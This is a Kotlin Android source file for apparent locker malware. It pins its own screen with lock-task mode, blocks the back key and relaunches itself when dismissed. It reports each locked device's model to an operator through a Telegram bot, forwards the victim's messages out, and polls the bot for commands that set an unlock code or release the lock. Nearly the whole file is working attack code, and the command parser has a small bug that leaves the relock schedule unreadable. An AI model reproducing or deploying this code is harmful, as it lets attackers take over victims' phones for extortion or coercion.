package com.contoh.locker

import android.app.ActivityManager
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.KeyEvent
import android.view.View
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class LockActivity : AppCompatActivity() {

    private var offset = 0L
    private var kodeAktif: String? = null
    private val pool = Executors.newSingleThreadScheduledExecutor()
    private val ui = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_lock)

        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        try {
            if (dpm.isDeviceOwnerApp(packageName)) {
                dpm.setLockTaskPackages(admin(), arrayOf(packageName))
            }
            startLockTask()
        } catch (_: Exception) {}

        findViewById<View>(R.id.btnKirim).setOnClickListener {
            val ed = findViewById<EditText>(R.id.edChat)
            val msg = ed.text.toString().trim()
            if (msg.isEmpty()) return@setOnClickListener

            // Cek apakah input adalah kode buka
            if (kodeAktif != null && msg == kodeAktif) {
                addBubble("Kamu: $msg")
                addBubble("✅ Kode benar, membuka...")
                ed.setText("")
                unlockNow()
                return@setOnClickListener
            }

            // Bukan kode -> kirim sebagai chat
            TelegramSender.send("🆘 ${android.os.Build.MODEL}: $msg")
            addBubble("Kamu: $msg")
            ed.setText("")
        }

        TelegramSender.send("📱 Perangkat baru terpasang & terkunci: ${android.os.Build.MODEL}")
        startPolling()
    }

    private fun admin() = android.content.ComponentName(this, AdminReceiver::class.java)

    private fun startPolling() {
        pool.scheduleWithFixedDelay({
            try {
                val url = "https://api.telegram.org/bot${TelegramSender.BOT_TOKEN}/getUpdates?offset=$offset&timeout=0"
                val r = okhttp3.OkHttpClient().newCall(okhttp3.Request.Builder().url(url).build()).execute()
                val body = r.body?.string() ?: return@scheduleWithFixedDelay
                val arr = JSONObject(body).optJSONArray("result") ?: return@scheduleWithFixedDelay
                for (i in 0 until arr.length()) {
                    val u = arr.getJSONObject(i)
                    offset = u.getLong("update_id") + 1
                    val text = u.optJSONObject("message")?.optString("text") ?: continue
                    if (!text.startsWith("/")) continue
                    handleCommand(text)
                }
            } catch (_: Exception) {}
        }, 0, 3, TimeUnit.SECONDS)
    }

    private fun handleCommand(cmd: String) {
        val parts = cmd.trim().split(" ", limit = 2)
        when (parts[0]) {
            "/send" -> {
                val msg = parts.getOrNull(1) ?: return
                ui.post { addBubble("Owner: $msg") }
            }
            "/kode" -> {
                val kode = parts.getOrNull(1)?.trim() ?: return
                kodeAktif = kode
                ui.post { addBubble("Owner: Masukkan kode untuk membuka.") }
            }
            "/unlock" -> {
                val onoff = parts.getOrNull(1)?.lowercase() ?: "off"
                val jadwal = parts.getOrNull(2) ?: "tidak"
                if (onoff == "on") {
                    ui.post { unlockNow() }
                } else if (onoff == "off") {
                    val ms = parseJadwal(jadwal)
                    if (ms > 0) {
                        ui.post {
                            addBubble("Akan terkunci lagi dalam $jadwal")
                            ui.postDelayed({ relock() }, ms)
                        }
                    } else {
                        ui.post { addBubble("Tetap terkunci.") }
                    }
                }
            }
        }
    }

    private fun parseJadwal(s: String): Long = when (s.lowercase()) {
        "10 menit" -> 10 * 60_000L
        "1 jam" -> 60 * 60_000L
        "3 hari" -> 3 * 24 * 60 * 60_000L
        else -> 0L
    }

    private fun unlockNow() {
        try { stopLockTask() } catch (_: Exception) {}
        moveTaskToBack(true)
    }

    private fun relock() {
        startActivity(Intent(this, LockActivity::class.java)
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
    }

    private fun addBubble(t: String) {
        val box = findViewById<LinearLayout>(R.id.chatBox)
        val tv = TextView(this)
        tv.text = t
        tv.setPadding(16, 8, 16, 8)
        box.addView(tv)
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK) return true
        return super.onKeyDown(keyCode, event)
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) {
            val am = getSystemService(ACTIVITY_SERVICE) as ActivityManager
            val top = am.getRunningTasks(1).firstOrNull()?.topActivity?.packageName
            if (top != packageName) {
                startActivity(Intent(this, LockActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            }
        }
    }
}